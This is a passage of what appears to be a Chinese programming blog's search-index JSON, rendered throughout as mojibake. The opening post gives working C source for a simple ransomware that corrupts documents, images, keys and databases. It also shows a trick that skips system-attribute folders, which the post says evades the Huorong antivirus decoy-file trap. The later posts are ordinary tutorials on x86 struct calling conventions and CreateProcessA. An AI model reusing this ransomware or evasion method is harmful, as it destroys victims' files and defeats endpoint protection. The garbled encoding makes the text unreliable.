ç«ç»’åˆ›å»ºçš„ä¸¤ä¸ªæ–‡ä»¶å¤¹åç§°åˆ†åˆ«ä¸º&quot; program694&quot;å’Œ&quot;Zsetup287&quot;ï¼Œå®ƒä»¬åœ¨æ–‡ä»¶èµ„æºç®¡ç†å™¨ä¸­æ˜¯çœ‹ä¸åˆ°çš„ï¼Œè¿™ä¸€ç‰¹æ€§å¯ä»¥é¿å…ç”¨æˆ·è¯¯è®¿é—®è¯±é¥µæ–‡ä»¶é€ æˆè¯¯æŠ¥ã€‚ å€ŸåŠ©FindFirstFileå’ŒFindNextFileå¯ä»¥è·å–ä¸€ä¸ªè·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œè¿™äº›æ–‡ä»¶çš„ä¿¡æ¯éƒ½è¿”å›åˆ°ä¸€ä¸ªWIN32_FIND_DATAç±»å‹çš„ç»“æ„ä½“ä¸­ï¼Œè¿™ä¸ªç»“æ„ä½“é‡Œæœ‰ä¸ªå…ƒç´ dwFileAttributesï¼Œè¡¨ç¤ºäº†è¯¥æ–‡ä»¶çš„ä¿¡æ¯ï¼Œå¦‚æ˜¯å¦ä¸ºæ–‡ä»¶å¤¹ã€æ˜¯å¦ä¸ºéšè—æ–‡ä»¶ã€æ˜¯å¦ä¸ºç³»ç»Ÿæ–‡ä»¶ç­‰ã€‚ WIN32_FIND_DATAA ç¼–å†™ç¨‹åºï¼ŒæŸ¥çœ‹Cç›˜ä¸­æ–‡ä»¶çš„æ–‡ä»¶åå’Œéƒ¨åˆ†æ–‡ä»¶å±æ€§ï¼š 123456789101112131415161718192021222324252627282930313233343536#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void ParseFileSystem(char *path) { WIN32_FIND_DATAA FileData; HANDLE hFindFile = FindFirstFileA(path, &amp;FileData); do { printf(FileData.cFileName); for (int i = 0; i &lt; 25 - (int)strlen(FileData.cFileName); i++) { printf(&quot; &quot;); } if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) { printf(&quot;\\t&lt;DIR&gt; &quot;); } else { printf(&quot;\\t&lt;FILE&gt;&quot;); } if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_HIDDEN) { printf(&quot;\\tHidden&quot;); } else { printf(&quot;\\tShow &quot;); } if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_SYSTEM) { printf(&quot;\\tSystem&quot;); } else { printf(&quot;\\tNormal&quot;); } printf(&quot;\\n&quot;); } while (FindNextFileA(hFindFile, &amp;FileData));}int main(int argc, char **argv) { char path[100] = &quot;C:\\\\*&quot;; ParseFileSystem(path); return 0;} è¿è¡Œç»“æœï¼š 12345678910111213141516171819C:\\&gt;d:\\mydir.exe program694 &lt;DIR&gt; Hidden System$Recycle.Bin &lt;DIR&gt; Hidden System$WinREAgent &lt;DIR&gt; Hidden Normalbootmgr &lt;FILE&gt; Hidden SystemBOOTNXT &lt;FILE&gt; Hidden SystemDocuments and Settings &lt;DIR&gt; Hidden SystemDumpStack.log.tmp &lt;FILE&gt; Hidden Systempagefile.sys &lt;FILE&gt; Hidden SystemPerfLogs &lt;DIR&gt; Show NormalProgram Files &lt;DIR&gt; Show NormalProgram Files (x86) &lt;DIR&gt; Show NormalProgramData &lt;DIR&gt; Hidden NormalRecovery &lt;DIR&gt; Hidden Systemswapfile.sys &lt;FILE&gt; Hidden SystemSystem Volume Information &lt;DIR&gt; Hidden SystemUsers &lt;DIR&gt; Show NormalWindows &lt;DIR&gt; Show NormalZsetup287 &lt;DIR&gt; Hidden System å‘ç°ç«ç»’åˆ›å»ºçš„ä¸¤ä¸ªè¯±é¥µæ–‡ä»¶å¤¹éƒ½å…·æœ‰FILE_ATTRIBUTE_HIDDENå’ŒFILE_ATTRIBUTE_SYSTEMå±æ€§ã€‚å‹’ç´¢è½¯ä»¶åªéœ€è¦é¿å¼€å…·æœ‰FILE_ATTRIBUTE_SYSTEMå±æ€§çš„æ–‡ä»¶å¤¹å°±å¯ä»¥é¿å¼€ç«ç»’çš„è¯±é¥µæ–‡ä»¶äº†ã€‚ ç¼–å†™ç®€å•çš„å‹’ç´¢è½¯ä»¶æ ·æœ¬é¦–å…ˆå†™ä¸€ä¸ªå¯ä»¥è¢«ç«ç»’æ‹¦æˆªçš„ç®€å•å‹’ç´¢è½¯ä»¶ã€‚åªéœ€è¦å€ŸåŠ©FindFirstFileå’ŒFindNextFileéå†æ–‡ä»¶ï¼Œåˆ¤æ–­ä¸€ä¸‹æ–‡ä»¶åç¼€åï¼Œç„¶åå†è¯»å†™æ–‡ä»¶å°±è¡Œäº†ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include &lt;windows.h&gt;#include &lt;stdio.h&gt;// å°†ç›®å½•ådirå’Œæ–‡ä»¶åfilenameæ‹¼æ¥void concat_path(char *dir, char *filename) { int i = 0; while (dir[i] != '\\0') { i++; } if (dir[i-1] != '\\\\') { dir[i] = '\\\\'; i++; } int j = 0; while (filename[j] != '\\0') { dir[i] = filename[j]; i++; j++; } dir[i] = '\\0';}// ä»è·¯å¾„ä¸­åˆ å»æœ€åä¸€é¡¹ç›®å½•å/æ–‡ä»¶åvoid remove_file_path(char *dir) { int i = 0; while (dir[i] != '\\0') { i++; } if (dir[i-1] == '\\\\') { i -= 2; } while (dir[i] != '\\\\') { i--; } dir[i+1] = '\\0';}BOOL is_target_filetype(char *filepath) { int length = strlen(filepath); BOOL result = FALSE; if (length &gt;= 4) { result = result || !strcmp(&amp;filepath[length-4], &quot;.doc&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.xls&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.sql&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.pem&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.jpg&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.rtf&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.txt&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.mdb&quot;); } if (length &gt;= 5) { result = result || !strcmp(&amp;filepath[length-5], &quot;.xlsx&quot;); result = result || !strcmp(&amp;filepath[length-5], &quot;.docx&quot;); } return result;}void ParseFileSystem(char *path) { WIN32_FIND_DATAA FileData; concat_path(path, &quot;*&quot;); HANDLE hFindFile = FindFirstFileA(path, &amp;FileData); remove_file_path(path); do { if (FileData.cFileName[0] == '.') { continue; } if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) { concat_path(path, FileData.cFileName); ParseFileSystem(path); remove_file_path(path); } else if (is_target_filetype(FileData.cFileName)) { concat_path(path, FileData.cFileName); printf(path); HANDLE hFile = CreateFile(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hFile) { goto nextfile; } char Buffer[100]; int num; if (!ReadFile(hFile, Buffer, 100, &amp;num, NULL)) { goto nextfile; } for (int i = 0; i &lt; num; i++) { Buffer[i] = ~Buffer[i]; } SetFilePointer(hFile, 0, NULL, FILE_BEGIN); if(WriteFile(hFile, Buffer, num, NULL, NULL)) { printf(&quot;\\tsuccess&quot;); } nextfile: printf(&quot;\\n&quot;); remove_file_path(path); } } while (FindNextFileA(hFindFile, &amp;FileData));}int main() { char path[100] = &quot;D:\\\\aaa&quot;; ParseFileSystem(path); return 0;} ç¼–è¯‘å®Œæˆåï¼Œåœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ï¼ˆå¦‚010 Editorï¼‰æŠŠ&quot;D:\\aaa&quot;å­—ç¬¦ä¸²æ›¿æ¢æˆ&quot;C:\\&quot;ï¼Œç„¶ååœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œã€‚å‹’ç´¢è½¯ä»¶é¦–å…ˆå°±éå†åˆ°äº†ç«ç»’è®¾è®¡çš„è¯±é¥µæ–‡ä»¶å¤¹&quot; program694&quot;ä¸­çš„è¯±é¥µæ–‡ä»¶å¹¶å°è¯•å¯¹å…¶è¿›è¡ŒåŠ å¯†ï¼Œäºæ˜¯å°±è¢«ç«ç»’æ‹¦æˆªäº†ï¼š åˆ¤æ–­æ–‡ä»¶å±æ€§å¹¶é¿å¼€è¯±é¥µæ–‡ä»¶åœ¨éå†æ–‡ä»¶çš„ä»£ç ä¸­æ·»åŠ è¿™ä¸€æ®µä»£ç ï¼š 123if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_SYSTEM) { continue;} å¦‚æœæ–‡ä»¶å…·æœ‰FILE_ATTRIBUTE_SYSTEMå±æ€§å°±è·³è¿‡è¿™ä¸€æ–‡ä»¶ï¼Œè¿™æ ·å°±é¿å¼€äº†ç«ç»’çš„è¯±é¥µæ–‡ä»¶ã€‚ç”¨åŒæ ·çš„æ–¹å¼åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œç¨‹åºï¼š ç¨‹åºå¯ä»¥æ­£å¸¸è¿è¡Œå¹¶ä¸”æ²¡æœ‰è¢«ç«ç»’çš„å‹’ç´¢ç—…æ¯’è¯±æ•åŠŸèƒ½æ‹¦æˆªã€‚","link":"/2021/09/09/ransomware-bypass-huorong-decoy-file/"},{"title":"å‡½æ•°å‚æ•°åŠè¿”å›å€¼ä¸ºç»“æ„ä½“æ—¶çš„æ±‡ç¼–ä»£ç ","text":"æœ¬æ–‡è®°å½•äº†å‡½æ•°å‚æ•°ä»¥åŠè¿”å›å€¼æ˜¯ç»“æ„ä½“æ—¶ï¼Œæ±‡ç¼–ä»£ç æ˜¯ä»€ä¹ˆæ ·çš„ã€‚æœ¬æ–‡ä½¿ç”¨çš„ç¼–è¯‘å™¨ä¸ºVisual Studioä¸­çš„cl.exeï¼Œç‰ˆæœ¬ä¸ºç”¨äº x86 çš„ Microsoft (R) C/C++ ä¼˜åŒ–ç¼–è¯‘å™¨ 19.28.29910 ç‰ˆã€‚ å®šä¹‰ç»“æ„ä½“å®šä¹‰è¿™æ ·ä¸€ä¸ªç»“æ„ä½“ï¼š 12345struct tagTest { int a; long long b; char c[4];}; ç¼–è¯‘åï¼Œå„æˆå‘˜çš„åç§»ä¸ºï¼š 1234567tagTest struc ; (sizeof=0x18, mappedto_56) a dd ? field_4 dd ? b dq ? c db 4 dup(?) ; string(C) field_14 dd ?tagTest ends å…¶ä¸­field_4å’Œfield_14æ˜¯å¡«å……ï¼Œç»“æ„ä½“å¤§å°ä¸º24å­—èŠ‚ã€‚ å‡½æ•°å‚æ•°ä¸ºç»“æ„ä½“ç¼–å†™å‡½æ•°å¹¶è°ƒç”¨ï¼š 12345678910long long paramTest(int p1, struct tagTest p2, int p3) { return p1 + p2.a + p2.b + p3;}int main() { struct tagTest param = {0xAAAAAAAA, 0xBBBBBBBBCCCCCCCC, &quot;aaaa&quot;}; paramTest(1, param, 3); return 0;} è°ƒç”¨paramTestå‰å°†å‚æ•°å‹å…¥å †æ ˆçš„æ±‡ç¼–ä»£ç ä¸ºï¼š 1234567891011121314151617push 3sub esp, 24mov edx, espmov eax, [ebp+param.a]mov [edx], eaxmov ecx, [ebp+param.field_4]mov [edx+4], ecxmov eax, dword ptr [ebp+param.b]mov [edx+8], eaxmov ecx, dword ptr [ebp+param.b+4]mov [edx+12], ecxmov eax, dword ptr [ebp+param.c]mov [edx+16], eaxmov ecx, [ebp+param.field_14]mov [edx+20], ecxpush 1call paramTest é¦–å…ˆå‹å…¥ç¬¬ä¸‰ä¸ªå‚æ•°3ï¼Œç„¶åå°†24å­—èŠ‚çš„ç»“æ„ä½“å…¨éƒ¨å¤åˆ¶åˆ°æ ˆä¸­ï¼Œæœ€åå‹å…¥ç¬¬ä¸€ä¸ªå‚æ•°1ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨paramTestå‰æ ˆçš„ç»“æ„ä¸ºï¼š æ€»ç»“ï¼šå½“å‡½æ•°å‚æ•°ä¸ºç»“æ„ä½“æ—¶ï¼Œåœ¨å°†å‚æ•°å‹æ ˆçš„è¿‡ç¨‹ä¸­ï¼Œç»“æ„ä½“ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šå¤åˆ¶åˆ°æ ˆä¸­ã€‚ å‡½æ•°è¿”å›å€¼ä¸ºç»“æ„ä½“ç¼–å†™å‡½æ•°å¹¶è°ƒç”¨ï¼š 12345678910struct tagTest retTest(int a, long long b) { struct tagTest retVal = {a, b, &quot;cccc&quot;}; return retVal;}int main() { struct tagTest result = retTest(0x11111111, 0x2222222233333333); return 0;} è°ƒç”¨retTestå‡½æ•°å‰å°†å‚æ•°å‹æ ˆçš„ä»£ç ï¼š 123456push 22222222hpush 33333333h ; bpush 11111111h ; alea edx, [ebp+retVal]push edx ; retstrcall retTest é™¤äº†å‡½æ•°åŸæœ‰çš„ä¸¤ä¸ªå‚æ•°å¤–ï¼Œè¿˜å‹äº†ä½äºæ ˆä¸­çš„ç»“æ„ä½“å˜é‡retValçš„åœ°å€ï¼Œå‘½åä¸ºpRetValã€‚ è¿›å…¥retTestå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªstruct tagTestç±»å‹çš„å±€éƒ¨å˜é‡ï¼Œå‘½åä¸ºtmpã€‚å‡½æ•°å¼€å¤´çš„è¿™æ®µæ±‡ç¼–ä»£ç å°†tmpèµ‹å€¼ä¸º{a, b, &quot;cccc&quot;}ï¼š 12345678mov eax, [ebp+a]mov [ebp+tmp.a], eaxmov ecx, [ebp+b_low]mov edx, [ebp+b_high]mov dword ptr [ebp+tmp.b], ecxmov dword ptr [ebp+tmp.b+4], edxmov eax, dword_419000 ; &quot;cccc&quot;mov dword ptr [ebp+tmp.c], eax æ¥ä¸‹æ¥è¿™æ®µæ±‡ç¼–ä»£ç åˆ™å°†tmpçš„å†…å®¹å¤åˆ¶åˆ°pRetValæŒ‡å‘çš„ç»“æ„ä½“retValï¼š 12345678910111213mov ecx, [ebp+pRetVal]mov edx, [ebp+tmp.a]mov [ecx], edxmov eax, [ebp+tmp.field_4]mov [ecx+4], eaxmov edx, dword ptr [ebp+tmp.b]mov [ecx+8], edxmov eax, dword ptr [ebp+tmp.b+4]mov [ecx+0Ch], eaxmov edx, dword ptr [ebp+tmp.c]mov [ecx+10h], edxmov eax, [ebp+tmp.field_14]mov [ecx+14h], eax å‡½æ•°çš„è¿”å›å€¼ä¸ºpRetValï¼š 1mov eax, [ebp+pRetVal] æ€»ç»“ï¼šå½“å‡½æ•°è¿”å›å€¼ä¸ºç»“æ„ä½“ï¼Œå‡½æ•°çš„è°ƒç”¨æ–¹mainå‡½æ•°ä¼šåœ¨æ ˆä¸­é¢„ç•™ä¸€æ®µç©ºé—´retValç”¨äºå­˜æ”¾è¿”å›å€¼ã€‚å½“mainå‡½æ•°è°ƒç”¨retTestå‡½æ•°æ—¶ï¼Œé™¤äº†æœ¬èº«çš„ä¸¤ä¸ªå‚æ•°å¤–ï¼Œè¿˜ä¼šå‹å…¥retValçš„åœ°å€&amp;retValã€‚retTestå‡½æ•°ä¼šæ ¹æ®ä¼ å…¥çš„retValçš„åœ°å€ï¼Œå°†è¿”å›å€¼å¤åˆ¶åˆ°retValå½“ä¸­ï¼Œå¹¶è¿”å›&amp;retValã€‚ ä½¿ç”¨IDAçš„Set type...åŠŸèƒ½ä¹Ÿèƒ½çœ‹å‡ºè¿™ä¸€ç‚¹ï¼Œå¦‚æœåœ¨Set type...çª—å£è¾“å…¥ï¼š 1tagTest retTest(int a, long long b) IDAä¼šå°†å…¶è‡ªåŠ¨è½¬æ¢ä¸ºï¼š 1tagTest *retTest(tagTest *__return_ptr __struct_ptr retstr, int a, __int64 b); å…¶ä¸­retstrå°±æ˜¯æŒ‡å‘retValçš„æŒ‡é’ˆã€‚ ä¸‹é¢è¿™ä¸¤ä¸ªCè¯­è¨€å‡½æ•°ç¼–è¯‘åçš„æ±‡ç¼–ä»£ç åº”è¯¥æ˜¯ä¸€æ ·çš„ï¼š 12345678910111213141516171819struct tagTest retTest(int a, long long b) { struct tagTest retVal = {a, b, &quot;cccc&quot;}; return retVal;}struct tagTest *retTest2(struct tagTest *pRetVal, int a, long long b) { struct tagTest tmp = {a, b, &quot;cccc&quot;}; *pRetVal = tmp; return pRetVal;}int main() { struct tagTest result1 = retTest(0x11111111, 0x2222222233333333); struct tagTest retVal; struct tagTest *pRetVal = retTest2(&amp;retVal, 0x11111111, 0x2222222233333333); struct tagTest result2 = *pRetVal; return 0;}","link":"/2021/08/13/structure-function-parameter-return-value/"},{"title":"åœ¨Windowsä¸­ä½¿ç”¨CreateProcessåˆ›å»ºå­è¿›ç¨‹","text":"æœ¬æ–‡è®°å½•äº†åœ¨Windowsä¸­ä½¿ç”¨CreateProcessAåˆ›å»ºå­è¿›ç¨‹çš„æ–¹æ³•ã€‚ CreateProcessAå‡½æ•°åŸå‹123456789101112BOOL CreateProcessA( LPCSTR lpApplicationName, //åº”ç”¨ç¨‹åºå LPSTR lpCommandLine, //å‘½ä»¤è¡Œ LPSECURITY_ATTRIBUTES lpProcessAttributes, //å¦‚æœä¸ºNULLï¼Œåˆ™å­è¿›ç¨‹ä¸ä¼šç»§æ‰¿æ–°è¿›ç¨‹çš„å¥æŸ„ LPSECURITY_ATTRIBUTES lpThreadAttributes, //å¦‚æœä¸ºNULLï¼Œåˆ™å­è¿›ç¨‹ä¸ä¼šç»§æ‰¿æ–°çº¿ç¨‹çš„å¥æŸ„ BOOL bInheritHandles, //çˆ¶è¿›ç¨‹çš„å¯ç»§æ‰¿å¥æŸ„æ˜¯å¦ç»§æ‰¿ç»™æ–°çš„è¿›ç¨‹ DWORD dwCreationFlags, //æ§åˆ¶å­è¿›ç¨‹çš„åˆ›å»ºè¿‡ç¨‹å’Œä¼˜å…ˆçº§çš„æ ‡å¿— LPVOID lpEnvironment, //å¦‚æœä¸ºNULLï¼Œåˆ™æ–°çš„è¿›ç¨‹ä¼šä½¿ç”¨çˆ¶è¿›ç¨‹çš„ç¯å¢ƒ LPCSTR lpCurrentDirectory, //å¦‚æœä¸ºNULLï¼Œåˆ™æ–°çš„è¿›ç¨‹ä¸çˆ¶è¿›ç¨‹ä¼šæœ‰ç›¸åŒç›®å½• LPSTARTUPINFOA lpStartupInfo, //ç”¨äºè®¾ç½®æ–°è¿›ç¨‹çš„ä¸»çª—å£ç‰¹æ€§ LPPROCESS_INFORMATION lpProcessInformation //PROCESS_INFORMATIONæŒ‡é’ˆï¼Œç”¨äºè·å–æ–°è¿›ç¨‹çš„ä¿¡æ¯); æœ¬æ–‡åªå…³å¿ƒlpApplicationName, lpCommandLine, lpStartupInfo, lpProcessInformation è¿™å››ä¸ªå‚æ•°ã€‚ ç®€å•ç¤ºä¾‹æ¥ä¸‹æ¥ï¼Œå†™ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹æ¥è¯´æ˜è¿™ä¸ªå‡½æ•°çš„åŸºæœ¬ç”¨æ³•ã€‚ ç¼–å†™ç¨‹åºä½œä¸ºå­è¿›ç¨‹ç¼–å†™child.cï¼Œä»£ç ä¸ºï¼š 12345678#include &lt;stdio.h&gt;int main(int argc, char **argv) { for(int i = 0; i &lt; argc; i++) { printf(&quot;argv[%d]: %s\\n&quot;, i, argv[i]); } return 0;} åŠŸèƒ½å¾ˆç®€å•ï¼Œå°±æ˜¯æ‰“å°argvå­—ç¬¦ä¸²æ•°ç»„çš„å†…å®¹ã€‚ç¼–è¯‘ååœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œchild 123456789 abcdefg !@#$%ï¼š 12345&gt; child 123456789 abcdefg !@#$%argv[0]: childargv[1]: 123456789argv[2]: abcdefgargv[3]: !@#$% ç¼–å†™ç¨‹åºè°ƒç”¨CreateProcessAåˆ›å»ºå­è¿›ç¨‹ç¼–å†™ç¨‹åºparentï¼Œä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;int main() { STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); CreateProcessA( &quot;child.exe&quot;, //lpApplicationName &quot;abcdefg !@#$%^&amp;&quot;, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation return 0;} parentä¼šè°ƒç”¨CreateProcessAï¼Œåˆ›å»ºå­è¿›ç¨‹childï¼Œè€Œchildåˆ™ä¼šæ‰“å°argvæ•°ç»„ï¼š 123&gt; parentargv[0]: abcdefgargv[1]: !@#$%^&amp; childä¸­argvçš„å†…å®¹å’ŒlpCommandLineå­—ç¬¦ä¸²çš„å†…å®¹æ˜¯ä¸€è‡´çš„ã€‚ lpApplicationNameå¯ä»¥ä¸ºNULLï¼Œæ­¤æ—¶åº”ç”¨ç¨‹åºçš„åå­—ä¸ºlpCommandLineä¸­ç¬¬ä¸€ä¸ªè¢«ç©ºæ ¼éš”å¼€çš„å­—ç¬¦ä¸²ï¼š CreateProcessA function (processthreadsapi.h) å¯¹ç®€å•ç¤ºä¾‹çš„è¿›ä¸€æ­¥å®Œå–„å¯¹åˆ›å»ºè¿›ç¨‹æ“ä½œæ˜¯å¦æˆåŠŸçš„åˆ¤æ–­CreateProcessAä¼šè¿”å›BOOLç±»å‹çš„å˜é‡ï¼Œè¡¨ç¤ºæœ¬æ¬¡åˆ›å»ºè¿›ç¨‹çš„æ“ä½œæ˜¯å¦æˆåŠŸã€‚å› æ­¤ï¼Œå¯ä»¥åŠ ä¸Šå¯¹å‡½æ•°è¿”å›å€¼çš„åˆ¤æ–­ï¼š 1234567891011121314BOOL result = CreateProcessA( &quot;child.exe&quot;, //lpApplicationName &quot;abcdefg !@#$%^&amp;&quot;, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformationif(!result) { printf(&quot;Create Process Failed!\\n&quot;); return -1;} åˆ›å»ºè¿›ç¨‹å¤±è´¥æ—¶è·å–é”™è¯¯ç å¦‚æœCreateProcessAè¿”å›FALSEï¼Œåˆ™å¯ä»¥é€šè¿‡GetLastErrorè·å–é”™è¯¯ç ï¼ŒGetLastErrorå®šä¹‰åœ¨å¤´æ–‡ä»¶errhandlingapi.hä¸­ã€‚ 1234if(!result) { printf(&quot;Create Process Failed! Error Code:%d\\n&quot;, GetLastError()); return -1;} åœ¨è°ƒç”¨CreateProcessAä¹‹å‰ï¼Œä¼šé€šè¿‡STARTUPINFO si = {0};å°†STARTUPINFOç»“æ„ä½“siçš„å†…å®¹æ¸…é›¶ã€‚ç°åœ¨å°†æ¸…é›¶æ“ä½œå»æ‰ï¼Œé‡æ–°ç¼–è¯‘è¿è¡Œparentï¼Œçœ‹æ˜¯å¦è¿˜èƒ½æˆåŠŸåˆ›å»ºå­è¿›ç¨‹ï¼š 12&gt; parentCreate Process Failed! Error Code:998 åˆ›å»ºå­è¿›ç¨‹å¤±è´¥äº†ï¼Œé”™è¯¯ç ä¸º998ï¼ŒæŸ¥é˜…System Error Codes (500-999)ï¼š ERROR_NOACCESS 998 (0x3E6) Invalid access to memory location. å‘ç”Ÿäº†å¯¹å†…å­˜åœ°å€çš„æ— æ•ˆè®¿é—®ã€‚è¿™è¯´æ˜STARTUPINFOç»“æ„ä½“ä½¿ç”¨ä¹‹å‰æ¸…é›¶æ˜¯æœ‰å¿…è¦çš„ã€‚ é€šè¿‡PROCESS_INFORMATIONç»“æ„ä½“è·å–å­è¿›ç¨‹ä¿¡æ¯CreateProcessAçš„æœ€åä¸€ä¸ªå‚æ•°ä¸ºLPPROCESS_INFORMATION lpProcessInformationï¼Œæ˜¯ä¸€ä¸ªPROCESS_INFOMATIONç»“æ„ä½“æŒ‡é’ˆã€‚PROCESS_INFOMATIONçš„å®šä¹‰ä¸ºï¼š 123456typedef struct _PROCESS_INFORMATION { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId;} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; CreateProcessAä¼šåˆ›å»ºä¸€ä¸ªè¿›ç¨‹å’Œå®ƒçš„ä¸»çº¿ç¨‹ï¼ŒhProcesså°±æ˜¯è¿™ä¸ªè¿›ç¨‹çš„å¥æŸ„ï¼ŒhThreadå°±æ˜¯è¿›ç¨‹çš„ä¸»çº¿ç¨‹çš„å¥æŸ„ã€‚dwProcessIdå’ŒdwThreadIdåˆ†åˆ«ä¸ºè¿›ç¨‹å’Œå®ƒçš„ä¸»çº¿ç¨‹çš„æ ‡è¯†ç¬¦IDã€‚ ç®€å•ç¤ºä¾‹ä¸­ä¼ å…¥çš„å‚æ•°ä¸º&amp;piï¼Œå› æ­¤å°±å¯ä»¥é€šè¿‡piå¾—åˆ°åˆ›å»ºçš„è¿›ç¨‹ä»¥åŠå…¶ä¸»çº¿ç¨‹çš„å¥æŸ„å’Œæ ‡è¯†ç¬¦äº†ã€‚æ·»åŠ å¦‚ä¸‹ä»£ç ï¼Œæ‰“å°å­è¿›ç¨‹çš„è¿›ç¨‹æ ‡è¯†ç¬¦ï¼š 1printf(&quot;Child Process ID: %d\\n&quot;, pi.dwProcessId); è¿è¡Œparentï¼š 1234&gt; parentChild Process ID: 13816argv[0]: abcdefgargv[1]: !@#$%^&amp; çˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹æ‰§è¡Œç»“æŸåœ¨Linuxä¸­ï¼Œçˆ¶è¿›ç¨‹å¯ä»¥é€šè¿‡waitç³»ç»Ÿè°ƒç”¨ç­‰å¾…å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ã€‚Windowsä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„åŠŸèƒ½ï¼Œå³WaitForSingleObjectã€‚ WaitForSingleObjectçš„å‡½æ•°åŸå‹ä¸ºï¼š 1234DWORD WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds); éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼ŒhHandleä¸ºå¯¹è±¡çš„å¥æŸ„ï¼ŒdwMillisecondsä¸ºç­‰å¾…çš„æ¯«ç§’æ•°ã€‚å¦‚æœå¯¹è±¡ç»“æŸï¼Œæˆ–å¯¹è±¡æ²¡æœ‰ç»“æŸä½†ç»è¿‡äº†dwMillisecondsæ¯«ç§’ï¼Œåˆ™ç­‰å¾…å®Œæ¯•ï¼Œè¿›ç¨‹ç»§ç»­æ‰§è¡Œåé¢çš„è¯­å¥ã€‚ çˆ¶è¿›ç¨‹å¯ä»¥é€šè¿‡PROCESS_INFORMATIONç»“æ„ä½“è·å–å­è¿›ç¨‹çš„è¿›ç¨‹å¥æŸ„ï¼Œç„¶åå†å°†å­è¿›ç¨‹çš„å¥æŸ„ä¼ å…¥WaitForSingleObjectä¸­ï¼Œå³å¯ç­‰å¾…å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ã€‚ åœ¨æ‰“å°å­è¿›ç¨‹IDå‰ï¼Œæ·»åŠ è¯­å¥ï¼š 1WaitForSingleObject(pi.hProcess, 10000); å†è¿è¡Œparentï¼Œå¾—åˆ°çš„ç»“æœä¸ºï¼š 1234&gt; parentargv[0]: abcdefgargv[1]: !@#$%^&amp;Child Process ID: 3944 è¯´æ˜çˆ¶è¿›ç¨‹ä¼šç­‰å¾…å­è¿›ç¨‹childæ‰§è¡Œå®Œæ¯•åå†æ‰“å°å­è¿›ç¨‹çš„IDã€‚ å…³é—­PROCESS_INFORMATIONä¸­çš„å¥æŸ„ä¸€ä¸ªæ›´å¥½çš„ä¹ æƒ¯æ˜¯åœ¨PROCESS_INFORMATIONä¸­çš„å¥æŸ„ä½¿ç”¨å®Œæ¯•åï¼Œç”¨CloseHandleå°†å…¶å…³é—­ã€‚ If the function succeeds, be sure to call the CloseHandle function to close the hProcess and hThread handles when you are finished with them. Otherwise, when the child process exits, the system cannot clean up the process structures for the child process because the parent process still has open handles to the child process. However, the system will close these handles when the parent process terminates, so the structures related to the child process object would be cleaned up at this point. åœ¨parent.cçš„æœ«å°¾æ·»åŠ CloseHandleä»£ç ï¼š 12CloseHandle(pi.hProcess);CloseHandle(pi.hThread); æœ€ç»ˆï¼Œå¾—åˆ°çš„å®Œæ•´çš„parent.cä»£ç ä¸ºï¼š 123456789101112131415161718192021222324252627282930#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;#include &lt;errhandlingapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;handleapi.h&gt;int main() { STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); BOOL result = CreateProcessA( &quot;child.exe&quot;, //lpApplicationName &quot;abcdefg !@#$%^&amp;&quot;, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation if(!result) { printf(&quot;Create Process Failed! Error Code:%d\\n&quot;, GetLastError()); return -1; } WaitForSingleObject(pi.hProcess, 10000); printf(&quot;Child Process ID: %d\\n&quot;, pi.dwProcessId); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;}","link":"/2021/01/17/windows-createprocess/"},{"title":"åˆ©ç”¨Windowsäº‹ä»¶é€šçŸ¥æœºåˆ¶ç›‘æ§è¿›ç¨‹åˆ›å»º","text":"åˆ©ç”¨Windowså†…æ 